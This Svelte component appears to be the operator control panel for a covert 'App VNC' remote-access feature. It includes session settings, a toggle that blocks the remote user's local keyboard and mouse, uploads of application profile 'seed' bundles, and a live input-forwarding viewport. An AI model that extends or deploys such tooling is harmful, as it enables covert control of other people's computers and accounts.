<script lang="ts">
	import { get } from 'svelte/store';
	import { onDestroy, onMount } from 'svelte';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import {
		Select,
		SelectContent,
		SelectItem,
		SelectTrigger
	} from '$lib/components/ui/select/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { listAppVncApplications } from '$lib/data/app-vnc-apps';
	import type { Client } from '$lib/data/clients';
	import { createAppVncSessionController } from '$lib/stores/app-vnc-session';
	import type {
		AppVncApplicationDescriptor,
		AppVncInputEvent,
		AppVncSessionSettings
	} from '$lib/types/app-vnc';

	const { client } = $props<{ client: Client }>();

	const applications = listAppVncApplications();
	const qualityOptions: { value: AppVncSessionSettings['quality']; label: string }[] = [
		{ value: 'lossless', label: 'Lossless' },
		{ value: 'balanced', label: 'Balanced' },
		{ value: 'bandwidth', label: 'Bandwidth saver' }
	];
	const platformLabels: Record<AppVncApplicationDescriptor['platforms'][number], string> = {
		windows: 'Windows',
		linux: 'Linux',
		macos: 'macOS'
	};

	type SeedKind = 'profile' | 'data';

	interface SeedBundle {
		id: string;
		appId: string;
		platform: AppVncApplicationDescriptor['platforms'][number];
		kind: SeedKind;
		fileName: string;
		originalName: string;
		size: number;
		sha256: string;
		uploadedAt: string;
	}

	const seedKinds: ReadonlyArray<{
		kind: SeedKind;
		label: string;
		description: string;
	}> = [
		{
			kind: 'profile',
			label: 'Profile seed',
			description: 'Pre-populated profile cloned before launch.'
		},
		{
			kind: 'data',
			label: 'Data seed',
			description: 'Optional data root materialized inside the workspace.'
		}
	] as const;

	let seedBundles = $state<SeedBundle[]>([]);
	let seedLoading = $state(false);
	let seedError = $state<string | null>(null);
	let seedStatus = $state<string | null>(null);
	let seedUploadFiles = $state<Record<string, File | null>>({});
	let seedUploading = $state<Record<string, boolean>>({});
	let seedDeleting = $state<string | null>(null);
	let selectedSeedAppId = $state(applications[0]?.id ?? '');

	const selectedSeedApplication = $derived(
		applications.find((app) => app.id === selectedSeedAppId.trim()) ?? null
	);

	const {
		session,
		frameUrl,
		frameWidth,
		frameHeight,
		lastHeartbeat,
		isStarting,
		isStopping,
		isUpdating,
		errorMessage,
		infoMessage,
		startSession,
		updateSession,
		stopSession,
		refreshSession,
		enqueueEvent,
		dispose
	} = createAppVncSessionController({ clientId: client.id, initialSession: null });

	let monitor = $state('Primary');
	let quality = $state<AppVncSessionSettings['quality']>('balanced');
	let captureCursor = $state(true);
	let clipboardSync = $state(false);
	let blockLocalInput = $state(false);
	let heartbeatInterval = $state<number | string>(30);
	let appId = $state('');
	let windowTitle = $state('');
	let viewportEl: HTMLDivElement | null = null;
	let pointerActive = false;
	let activePointerId: number | null = null;

	const normalizedAppId = $derived(appId.trim());
	const selectedApp = $derived(applications.find((app) => app.id === normalizedAppId) ?? null);
	const appSelectionLabel = $derived(
		selectedApp
			? selectedApp.name
			: normalizedAppId
				? `Custom · ${normalizedAppId}`
				: 'Manual selection'
	);

	function bundleKey(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind
	): string {
		return `${platform}:${kind}`;
	}

	function seedBundleFor(
		app: string,
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind
	): SeedBundle | null {
		return (
			seedBundles.find(
				(bundle) => bundle.appId === app && bundle.platform === platform && bundle.kind === kind
			) ?? null
		);
	}

	function currentSeedUpload(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind
	): File | null {
		return seedUploadFiles[bundleKey(platform, kind)] ?? null;
	}

	function setSeedUpload(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind,
		file: File | null
	) {
		seedUploadFiles = { ...seedUploadFiles, [bundleKey(platform, kind)]: file };
	}

	function seedUploadingKey(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind
	): boolean {
		return Boolean(seedUploading[bundleKey(platform, kind)]);
	}

	function seedBundlesForPlatform(
		app: string,
		platform: AppVncApplicationDescriptor['platforms'][number]
	): Array<{ kind: SeedKind; label: string; description: string; bundle: SeedBundle | null }> {
		return seedKinds.map((entry) => ({
			...entry,
			bundle: seedBundleFor(app, platform, entry.kind)
		}));
	}

	async function loadSeedBundles() {
		seedLoading = true;
		seedError = null;
		try {
			const response = await fetch('/api/app-vnc/seeds');
			if (!response.ok) {
				throw new Error(`Status ${response.status}`);
			}
			const body = (await response.json()) as { bundles?: SeedBundle[] };
			seedBundles = body.bundles ?? [];
		} catch (err) {
			seedError = (err as Error).message ?? 'Failed to load seed bundles.';
		} finally {
			seedLoading = false;
		}
	}

	async function uploadSeedBundle(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind
	) {
		const app = selectedSeedAppId.trim();
		if (!app) {
			seedError = 'Select an application before uploading a seed bundle.';
			return;
		}
		const file = currentSeedUpload(platform, kind);
		if (!file) {
			seedError = 'Choose a ZIP bundle before uploading.';
			return;
		}
		const key = bundleKey(platform, kind);
		seedUploading = { ...seedUploading, [key]: true };
		seedError = null;
		seedStatus = null;
		try {
			const form = new FormData();
			form.append('appId', app);
			form.append('platform', platform);
			form.append('kind', kind);
			form.append('bundle', file);
			const response = await fetch('/api/app-vnc/seeds', {
				method: 'POST',
				body: form
			});
			if (!response.ok) {
				throw new Error(`Status ${response.status}`);
			}
			const body = (await response.json()) as { bundles?: SeedBundle[] };
			seedBundles = body.bundles ?? seedBundles;
			setSeedUpload(platform, kind, null);
			const kindLabel = seedKinds.find((entry) => entry.kind === kind)?.label ?? 'Seed';
			seedStatus = `${kindLabel} uploaded for ${platformLabels[platform] ?? platform}.`;
		} catch (err) {
			seedError = (err as Error).message ?? 'Failed to upload seed bundle.';
		} finally {
			seedUploading = { ...seedUploading, [key]: false };
		}
	}

	async function deleteSeedBundle(bundle: SeedBundle) {
		const { id, kind, platform } = bundle;
		seedDeleting = id;
		seedError = null;
		seedStatus = null;
		try {
			const response = await fetch(`/api/app-vnc/seeds/${id}`, { method: 'DELETE' });
			if (!response.ok) {
				throw new Error(`Status ${response.status}`);
			}
			await loadSeedBundles();
			const kindLabel = seedKinds.find((entry) => entry.kind === kind)?.label ?? 'Seed';
			seedStatus = `${kindLabel} removed for ${platformLabels[platform] ?? platform}.`;
		} catch (err) {
			seedError = (err as Error).message ?? 'Failed to remove seed bundle.';
		} finally {
			seedDeleting = null;
		}
	}

	function handleSeedFileSelection(
		platform: AppVncApplicationDescriptor['platforms'][number],
		kind: SeedKind,
		event: Event
	) {
		const input = event.currentTarget as HTMLInputElement | null;
		const file = input?.files?.[0] ?? null;
		setSeedUpload(platform, kind, file);
	}

	function formatSeedSize(size?: number): string {
		if (!size || size <= 0) {
			return '—';
		}
		const kb = size / 1024;
		if (kb < 1024) {
			return `${kb >= 10 ? Math.round(kb) : Math.round(kb * 10) / 10} KB`;
		}
		const mb = kb / 1024;
		return `${mb >= 10 ? Math.round(mb) : Math.round(mb * 10) / 10} MB`;
	}

	function formatSeedTimestamp(value?: string): string {
		if (!value) {
			return '—';
		}
		const date = new Date(value);
		if (Number.isNaN(date.getTime())) {
			return value;
		}
		return date.toLocaleString();
	}

	function formatPlatforms(platforms?: AppVncApplicationDescriptor['platforms']): string {
		if (!platforms || platforms.length === 0) {
			return '';
		}
		return platforms.map((platform) => platformLabels[platform] ?? platform).join(', ');
	}

	function handleAppSelection(value: string) {
		appId = value.trim();
	}

	function resolveHeartbeatInterval(): number {
		const value = heartbeatInterval;
		if (typeof value === 'number') {
			return value;
		}
		const parsed = Number.parseInt(value, 10);
		if (Number.isFinite(parsed)) {
			return parsed;
		}
		return 30;
	}

	function buildSessionSettings(): AppVncSessionSettings {
		const heartbeat = resolveHeartbeatInterval();
		heartbeatInterval = heartbeat;
		const trimmedAppId = normalizedAppId;
		const trimmedWindowTitle = windowTitle.trim();
		return {
			monitor,
			quality,
			captureCursor,
			clipboardSync,
			blockLocalInput,
			heartbeatInterval: heartbeat,
			appId: trimmedAppId || undefined,
			windowTitle: trimmedWindowTitle || undefined
		} satisfies AppVncSessionSettings;
	}

	async function handleStartSession() {
		await startSession(buildSessionSettings());
	}

	async function handleUpdateSession() {
		await updateSession(buildSessionSettings());
	}

	async function handleStopSession() {
		await stopSession();
	}

	function pointerPosition(event: PointerEvent) {
		const element = viewportEl;
		if (!element) {
			return null;
		}
		const rect = element.getBoundingClientRect();
		if (rect.width <= 0 || rect.height <= 0) {
			return null;
		}
		const x = (event.clientX - rect.left) / rect.width;
		const y = (event.clientY - rect.top) / rect.height;
		return {
			x: Math.min(Math.max(x, 0), 1),
			y: Math.min(Math.max(y, 0), 1)
		};
	}

	function handlePointerMove(event: PointerEvent) {
		const current = get(session);
		if (!current?.active || !pointerActive) {
			return;
		}
		const position = pointerPosition(event);
		if (!position) {
			return;
		}
		enqueueEvent({
			type: 'pointer-move',
			capturedAt: Date.now(),
			x: position.x,
			y: position.y,
			normalized: true
		} satisfies AppVncInputEvent);
	}

	function handlePointerDown(event: PointerEvent) {
		const current = get(session);
		if (!current?.active) {
			return;
		}
		viewportEl?.focus();
		pointerActive = true;
		activePointerId = event.pointerId;
		try {
			const target = event.currentTarget as HTMLElement | null;
			target?.setPointerCapture?.(event.pointerId);
		} catch {
			// ignore
		}
		const position = pointerPosition(event);
		if (position) {
			enqueueEvent({
				type: 'pointer-move',
				capturedAt: Date.now(),
				x: position.x,
				y: position.y,
				normalized: true
			} satisfies AppVncInputEvent);
		}
		enqueueEvent({
			type: 'pointer-button',
			capturedAt: Date.now(),
			button: event.button === 2 ? 'right' : event.button === 1 ? 'middle' : 'left',
			pressed: true
		} satisfies AppVncInputEvent);
	}

	function handlePointerUp(event: PointerEvent) {
		if (pointerActive && activePointerId === event.pointerId) {
			enqueueEvent({
				type: 'pointer-button',
				capturedAt: Date.now(),
				button: event.button === 2 ? 'right' : event.button === 1 ? 'middle' : 'left',
				pressed: false
			} satisfies AppVncInputEvent);
			pointerActive = false;
			activePointerId = null;
			try {
				const target = event.currentTarget as HTMLElement | null;
				target?.releasePointerCapture?.(event.pointerId);
			} catch {
				// ignore
			}
		}
	}

	function handlePointerCancel(event: PointerEvent) {
		if (!pointerActive) {
			return;
		}
		pointerActive = false;
		activePointerId = null;
		try {
			const target = event.currentTarget as HTMLElement | null;
			target?.releasePointerCapture?.(event.pointerId);
		} catch {
			// ignore
		}
	}

	function handleWheel(event: WheelEvent) {
		const current = get(session);
		if (!current?.active) {
			return;
		}
		event.preventDefault();
		enqueueEvent({
			type: 'pointer-scroll',
			capturedAt: Date.now(),
			deltaX: event.deltaX,
			deltaY: event.deltaY,
			deltaMode: event.deltaMode
		} satisfies AppVncInputEvent);
	}

	function handleKey(event: KeyboardEvent, pressed: boolean) {
		const current = get(session);
		if (!current?.active) {
			return;
		}
		event.preventDefault();
		enqueueEvent({
			type: 'key',
			capturedAt: Date.now(),
			pressed,
			key: event.key,
			code: event.code,
			keyCode: event.keyCode,
			repeat: event.repeat,
			altKey: event.altKey,
			ctrlKey: event.ctrlKey,
			shiftKey: event.shiftKey,
			metaKey: event.metaKey
		} satisfies AppVncInputEvent);
	}

	$effect(() => {
		const current = $session;
		if (current && current.active) {
			quality = current.settings.quality;
			monitor = current.settings.monitor;
			captureCursor = current.settings.captureCursor;
			clipboardSync = current.settings.clipboardSync;
			blockLocalInput = current.settings.blockLocalInput;
			heartbeatInterval = current.settings.heartbeatInterval;
			appId = current.settings.appId?.trim() ?? '';
			windowTitle = current.settings.windowTitle?.trim() ?? '';
		}
	});

	$effect(() => {
		if (!selectedSeedAppId && applications.length > 0) {
			selectedSeedAppId = applications[0].id;
		}
	});

	onMount(() => {
		void refreshSession();
		void loadSeedBundles();
	});

	onDestroy(() => {
		dispose();
	});
</script>

<div class="space-y-4">
	<Card>
		<CardHeader>
			<CardTitle class="text-base">Session parameters</CardTitle>
			<CardDescription>
				Configure the isolated App VNC workspace before engaging the client.
			</CardDescription>
		</CardHeader>
		<CardContent class="space-y-6">
			<div class="grid gap-4 md:grid-cols-2">
				<div class="grid gap-4">
					<div class="grid gap-2">
						<Label for="workspace-avnc-application">Application profile</Label>
						<Select
							type="single"
							value={selectedApp ? selectedApp.id : ''}
							onValueChange={handleAppSelection}
						>
							<SelectTrigger id="workspace-avnc-application" class="w-full">
								<span class="truncate">{appSelectionLabel}</span>
							</SelectTrigger>
							<SelectContent>
								<SelectItem value="">
									<span class="flex flex-col gap-0.5">
										<span class="font-medium">Manual selection</span>
										<span class="text-xs text-muted-foreground"
											>Provide a custom identifier below</span
										>
									</span>
								</SelectItem>
								{#each applications as application (application.id)}
									<SelectItem value={application.id}>
										<span class="flex flex-col gap-0.5">
											<span class="font-medium">{application.name}</span>
											<span class="text-xs text-muted-foreground">{application.summary}</span>
										</span>
									</SelectItem>
								{/each}
							</SelectContent>
						</Select>
						{#if selectedApp}
							<p class="text-xs text-muted-foreground">
								{selectedApp.summary}
								{#if selectedApp.platforms?.length}
									· Supports {formatPlatforms(selectedApp.platforms)}
								{/if}
								{#if selectedApp.windowTitleHint}
									· Window title hint: “{selectedApp.windowTitleHint}”
								{/if}
							</p>
						{:else if normalizedAppId}
							<p class="text-xs text-muted-foreground">
								Custom profile targeting “{normalizedAppId}”. Ensure the agent recognises this
								identifier.
							</p>
						{:else}
							<p class="text-xs text-muted-foreground">
								Choose one of {applications.length} built-in profiles or provide your own identifier.
							</p>
						{/if}
					</div>
					<div class="grid gap-2">
						<Label for="workspace-avnc-app-id">Custom app identifier</Label>
						<Input
							id="workspace-avnc-app-id"
							placeholder="Override or provide your own identifier"
							bind:value={appId}
						/>
						<p class="text-xs text-muted-foreground">
							Applied value is forwarded directly to the agent; leave blank to rely on the selected
							profile.
						</p>
					</div>
				</div>
				<div class="grid gap-4">
					<div class="grid gap-2">
						<Label for="workspace-avnc-monitor">Preferred monitor</Label>
						<Input id="workspace-avnc-monitor" placeholder="Primary display" bind:value={monitor} />
						<p class="text-xs text-muted-foreground">
							The agent advertises active displays when a session handshake is established.
						</p>
					</div>
					<div class="grid gap-2">
						<Label for="workspace-avnc-quality">Encoding profile</Label>
						<Select
							type="single"
							value={quality}
							onValueChange={(value) => (quality = value as typeof quality)}
						>
							<SelectTrigger id="workspace-avnc-quality" class="w-full">
								<span class="truncate">
									{qualityOptions.find((option) => option.value === quality)?.label ?? quality}
								</span>
							</SelectTrigger>
							<SelectContent>
								{#each qualityOptions as option (option.value)}
									<SelectItem value={option.value}>{option.label}</SelectItem>
								{/each}
							</SelectContent>
						</Select>
					</div>
				</div>
			</div>

			<div class="grid gap-4 md:grid-cols-3">
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Mirror cursor</p>
						<p class="text-xs text-muted-foreground">Display remote cursor state</p>
					</div>
					<Switch bind:checked={captureCursor} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Clipboard tunnel</p>
						<p class="text-xs text-muted-foreground">Enable clipboard mirroring</p>
					</div>
					<Switch bind:checked={clipboardSync} />
				</label>
				<label
					class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3"
				>
					<div>
						<p class="text-sm font-medium text-foreground">Lock local input</p>
						<p class="text-xs text-muted-foreground">Block physical keyboard and mouse locally</p>
					</div>
					<Switch bind:checked={blockLocalInput} />
				</label>
			</div>

			<div class="grid gap-4 md:grid-cols-2">
				<div class="grid gap-2">
					<Label for="workspace-avnc-heartbeat">Heartbeat interval (seconds)</Label>
					<Input
						id="workspace-avnc-heartbeat"
						type="number"
						min={10}
						step={5}
						bind:value={heartbeatInterval}
					/>
					<p class="text-xs text-muted-foreground">
						Controls how often the agent renews the isolated session lease.
					</p>
				</div>
				<div class="grid gap-2">
					<Label for="workspace-avnc-window">Window title filter</Label>
					<Input
						id="workspace-avnc-window"
						placeholder="Optional window title"
						bind:value={windowTitle}
					/>
					<p class="text-xs text-muted-foreground">
						Restrict the session to windows matching this title fragment.
					</p>
				</div>
			</div>

			<div class="flex flex-wrap gap-3">
				{#if $session?.active}
					<Button type="button" onclick={handleUpdateSession} disabled={$isUpdating}>
						{$isUpdating ? 'Updating…' : 'Update session'}
					</Button>
					<Button
						type="button"
						variant="outline"
						onclick={handleStopSession}
						disabled={$isStopping}
					>
						{$isStopping ? 'Stopping…' : 'Stop session'}
					</Button>
				{:else}
					<Button type="button" onclick={handleStartSession} disabled={$isStarting}>
						{$isStarting ? 'Starting…' : 'Start session'}
					</Button>
				{/if}
			</div>

			{#if $errorMessage}
				<p class="text-sm text-destructive">{$errorMessage}</p>
			{/if}
			{#if $infoMessage}
				<p class="text-sm text-emerald-500">{$infoMessage}</p>
			{/if}
		</CardContent>
	</Card>

	<Card>
		<CardHeader>
			<CardTitle class="text-base">Seed bundle management</CardTitle>
			<CardDescription>
				Upload per-application seed bundles. Stored bundles are served from
				<code class="rounded bg-muted px-1 py-0.5 text-xs">resources/app-vnc</code>.
			</CardDescription>
		</CardHeader>
		<CardContent class="space-y-6">
			<div class="grid gap-2 md:max-w-sm">
				<Label for="workspace-avnc-seed-app">Application</Label>
				<Select
					type="single"
					value={selectedSeedAppId}
					onValueChange={(value) => (selectedSeedAppId = value)}
				>
					<SelectTrigger id="workspace-avnc-seed-app" class="w-full">
						<span class="truncate">
							{selectedSeedApplication
								? selectedSeedApplication.name
								: selectedSeedAppId
									? selectedSeedAppId
									: 'Select application'}
						</span>
					</SelectTrigger>
					<SelectContent>
						{#each applications as application (application.id)}
							<SelectItem value={application.id}>
								<span class="flex flex-col gap-0.5">
									<span class="font-medium">{application.name}</span>
									<span class="text-xs text-muted-foreground">
										{formatPlatforms(application.platforms)}
									</span>
								</span>
							</SelectItem>
						{/each}
					</SelectContent>
				</Select>
				<p class="text-xs text-muted-foreground">
					Bundles are delivered to agents on demand when launching the corresponding profile.
				</p>
			</div>

			<div class="flex flex-wrap gap-3">
				<Button
					type="button"
					variant="outline"
					size="sm"
					onclick={() => loadSeedBundles()}
					disabled={seedLoading}
				>
					{seedLoading ? 'Refreshing…' : 'Refresh metadata'}
				</Button>
			</div>

			{#if seedError}
				<p class="text-sm text-destructive">{seedError}</p>
			{/if}
			{#if seedStatus}
				<p class="text-sm text-emerald-500">{seedStatus}</p>
			{/if}

			{#if selectedSeedApplication}
				<div class="space-y-4">
					{#each selectedSeedApplication.platforms as platform (platform)}
						<div class="space-y-4 rounded-lg border border-border/60 p-4">
							<div class="flex items-center justify-between">
								<p class="text-sm font-medium text-foreground">
									{platformLabels[platform] ?? platform}
								</p>
							</div>
							<div class="grid gap-4 md:grid-cols-2">
								{#each seedBundlesForPlatform(selectedSeedApplication.id, platform) as seedEntry (seedEntry.kind)}
									<div
										class="space-y-3 rounded-lg border border-dashed border-border/60 bg-muted/20 p-3"
									>
										<div class="flex items-start justify-between gap-3">
											<div>
												<p class="text-sm font-medium text-foreground">{seedEntry.label}</p>
												<p class="text-xs text-muted-foreground">{seedEntry.description}</p>
											</div>
											{#if seedEntry.bundle}
												<Button
													type="button"
													variant="ghost"
													size="sm"
													class="text-destructive"
													onclick={() => seedEntry.bundle && deleteSeedBundle(seedEntry.bundle)}
													disabled={seedEntry.bundle ? seedDeleting === seedEntry.bundle.id : false}
												>
													{seedEntry.bundle && seedDeleting === seedEntry.bundle.id
														? 'Removing…'
														: 'Remove'}
												</Button>
											{/if}
										</div>
										<div class="rounded bg-background/80 p-2 text-xs text-muted-foreground">
											{#if seedEntry.bundle}
												<p>
													File: {seedEntry.bundle.originalName} ({formatSeedSize(
														seedEntry.bundle.size
													)})
												</p>
												<p>Uploaded: {formatSeedTimestamp(seedEntry.bundle.uploadedAt)}</p>
											{:else}
												<p>No bundle uploaded for this platform.</p>
											{/if}
										</div>
										<div class="space-y-2">
											<input
												class="block w-full rounded border border-border/60 bg-background px-3 py-2 text-sm"
												type="file"
												accept=".zip"
												onchange={(event) =>
													handleSeedFileSelection(platform, seedEntry.kind, event)}
											/>
											<Button
												type="button"
												size="sm"
												onclick={() => uploadSeedBundle(platform, seedEntry.kind)}
												disabled={!currentSeedUpload(platform, seedEntry.kind) ||
													seedUploadingKey(platform, seedEntry.kind)}
											>
												{seedUploadingKey(platform, seedEntry.kind)
													? 'Uploading…'
													: 'Upload bundle'}
											</Button>
										</div>
									</div>
								{/each}
							</div>
						</div>
					{/each}
				</div>
			{:else}
				<p class="text-sm text-muted-foreground">Select an application to manage seed bundles.</p>
			{/if}
		</CardContent>
	</Card>

	<Card>
		<CardHeader>
			<CardTitle class="text-base">Live application surface</CardTitle>
			<CardDescription>
				Engage with the remote workspace using covert application VNC transport.
			</CardDescription>
		</CardHeader>
		<CardContent class="space-y-4">
			<!-- svelte-ignore a11y_no_noninteractive_tabindex -->
			<!-- svelte-ignore a11y_no_noninteractive_element_interactions -->
			<div
				class="relative flex h-[360px] w-full items-center justify-center overflow-hidden rounded-lg border bg-black"
				role="application"
				tabindex={0}
				bind:this={viewportEl}
				data-testid="app-vnc-viewport"
				onpointerdown={handlePointerDown}
				onpointermove={handlePointerMove}
				onpointerup={handlePointerUp}
				onpointercancel={handlePointerCancel}
				onwheel={handleWheel}
				onkeydown={(event) => handleKey(event, true)}
				onkeyup={(event) => handleKey(event, false)}
			>
				{#if $frameUrl}
					<img
						src={$frameUrl}
						alt="App VNC frame"
						class="max-h-full max-w-full select-none"
						draggable={false}
					/>
				{:else}
					<p class="text-sm text-muted-foreground">No frame data available yet.</p>
				{/if}
			</div>
			<div class="grid gap-2 text-xs text-muted-foreground sm:grid-cols-2">
				<div>
					<span class="font-medium text-foreground">Session</span>
					<span class="ml-2">{$session?.active ? 'Active' : 'Idle'}</span>
				</div>
				<div>
					<span class="font-medium text-foreground">Frame size</span>
					<span class="ml-2">
						{#if $frameWidth && $frameHeight}
							{$frameWidth}×{$frameHeight}
						{:else}
							—
						{/if}
					</span>
				</div>
				<div>
					<span class="font-medium text-foreground">Last heartbeat</span>
					<span class="ml-2">{$lastHeartbeat ?? '—'}</span>
				</div>
				<div>
					<span class="font-medium text-foreground">Session ID</span>
					<span class="ml-2 truncate">{$session?.sessionId ?? '—'}</span>
				</div>
			</div>
		</CardContent>
	</Card>
</div>
